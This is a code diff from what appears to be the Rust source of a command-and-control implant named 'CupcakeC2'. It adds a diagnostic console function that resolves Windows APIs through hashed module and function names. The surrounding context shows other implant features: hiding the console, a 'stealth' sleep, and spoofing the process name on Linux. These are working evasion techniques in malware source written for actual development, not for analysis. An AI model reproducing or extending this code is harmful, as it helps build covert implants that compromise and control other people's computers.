@@ -59,6 +59,49 @@ pub fn hide_console() {
     }
 }
 
+pub fn setup_diagnostic_console() {
+    #[cfg(windows)]
+    unsafe {
+        let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
+        
+        // 1. Aggressively try to get a console
+        if let Some(alloc_addr) = get_api_addr(h_kernel32, hash_api_name(b"AllocConsole")) {
+            let alloc_console: unsafe extern "system" fn() -> i32 = std::mem::transmute(alloc_addr);
+            alloc_console();
+        }
+
+        // 2. Fallback diagnostic: OutputDebugStringA (View with DebugView)
+        if let Some(ods_addr) = get_api_addr(h_kernel32, hash_api_name(b"OutputDebugStringA")) {
+            let ods: unsafe extern "system" fn(*const u8) = std::mem::transmute(ods_addr);
+            ods(b"CupcakeC2: Diagnostic Console Requested\n\0".as_ptr());
+        }
+        
+        // 3. Re-open standard streams to the console
+        if let Some(set_std_addr) = get_api_addr(h_kernel32, hash_api_name(b"SetStdHandle")) {
+            if let Some(create_file_addr) = get_api_addr(h_kernel32, hash_api_name(b"CreateFileA")) {
+                let create_file: unsafe extern "system" fn(*const u8, u32, u32, *mut (), u32, u32, *mut ()) -> usize = std::mem::transmute(create_file_addr);
+                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 = std::mem::transmute(set_std_addr);
+                
+                let conout = b"CONOUT$\0";
+                let h_con = create_file(conout.as_ptr(), 0xC0000000, 2, std::ptr::null_mut(), 3, 0, std::ptr::null_mut());
+                
+                if h_con != (usize::MAX) {
+                    set_std_handle(0xFFFFFFF5, h_con); // STD_OUTPUT_HANDLE
+                    set_std_handle(0xFFFFFFF4, h_con); // STD_ERROR_HANDLE
+                    
+                    // Direct confirmation write
+                    if let Some(write_addr) = get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA")) {
+                        let write_console: unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut ()) -> i32 = std::mem::transmute(write_addr);
+                        let msg = b"\r\n========================================\r\n[!] CUPCAKE C2 DIAGNOSTIC CONSOLE\r\n[+] Console Allocated Successfully\r\n========================================\r\n\r\n";
+                        let mut written = 0;
+                        write_console(h_con, msg.as_ptr(), msg.len() as u32, &mut written, std::ptr::null_mut());
+                    }
+                }
+            }
+        }
+    }
+}
+
 pub async fn stealth_sleep(duration_ms: u32) {
     #[cfg(windows)]
     {
@@ -71,10 +114,10 @@ pub async fn stealth_sleep(duration_ms: u32) {
     }
 }
 
-pub fn spoof_process_name(name: &str) {
+pub fn spoof_process_name(_name: &str) {
     #[cfg(target_os = "linux")]
     {
-        if let Ok(c_name) = std::ffi::CString::new(name) {
+        if let Ok(c_name) = std::ffi::CString::new(_name) {
             unsafe {
                 libc::prctl(15, c_name.as_ptr(), 0, 0, 0);
             }
